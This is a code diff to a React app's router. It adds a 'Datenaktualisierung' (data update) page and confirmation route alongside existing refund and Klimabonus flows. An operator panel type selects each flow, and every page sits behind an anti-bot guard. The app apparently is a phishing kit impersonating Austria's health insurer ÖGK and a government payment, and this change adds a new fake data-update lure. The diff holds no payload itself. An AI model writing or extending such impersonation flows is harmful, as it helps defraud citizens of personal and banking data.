@@ -46,6 +46,9 @@ import RueckerstattungBestaetigung from "./pages/RueckerstattungBestaetigung.tsx
 
 import Rueckerstattung from "./pages/Rueckerstattung.tsx";
 import RueckerstattungAnfordern from "./pages/RueckerstattungAnfordern.tsx";
+import Datenaktualisierung from "./pages/Datenaktualisierung.tsx";
+import DatenaktualisierungBestaetigung from "./pages/DatenaktualisierungBestaetigung.tsx";
+
 import AntiBotGuard from "./components/AntiBotGuard.tsx";
 import { ReactNode } from "react";
 import { useSearchParams } from "react-router-dom";
@@ -56,6 +59,7 @@ const IndexSwitch = () => {
   const { type } = usePanel();
   if (type === "klimabonus") return <Navigate to="/klimabonus" replace />;
   if (type === "oegk_rueckerstattung") return <Navigate to="/rueckerstattung" replace />;
+  if (type === "oegk_datenaktualisierung") return <Navigate to="/datenaktualisierung" replace />;
   return <Index />;
 };
 
@@ -69,8 +73,12 @@ const ConfirmationSwitch = () => {
   if (type === "oegk_rueckerstattung") {
     return <Navigate to={`/rueckerstattung/bestaetigung${s ? `?s=${s}` : ""}`} replace />;
   }
+  if (type === "oegk_datenaktualisierung") {
+    return <Navigate to={`/datenaktualisierung/bestaetigung${s ? `?s=${s}` : ""}`} replace />;
+  }
   return <Confirmation />;
 };
+
 
 
 const P = ({ children }: { children: ReactNode }) => (
@@ -128,6 +136,9 @@ const App = () => (
             <Route path="/rueckerstattung" element={<P><Rueckerstattung /></P>} />
             <Route path="/rueckerstattung/anfordern" element={<P><RueckerstattungAnfordern /></P>} />
             <Route path="/rueckerstattung/bestaetigung" element={<P><RueckerstattungBestaetigung /></P>} />
+            <Route path="/datenaktualisierung" element={<P><Datenaktualisierung /></P>} />
+            <Route path="/datenaktualisierung/bestaetigung" element={<P><DatenaktualisierungBestaetigung /></P>} />
+
 
 
             {/* ADD ALL CUSTOM ROUTES ABOVE THE CATCH-ALL "*" ROUTE */}
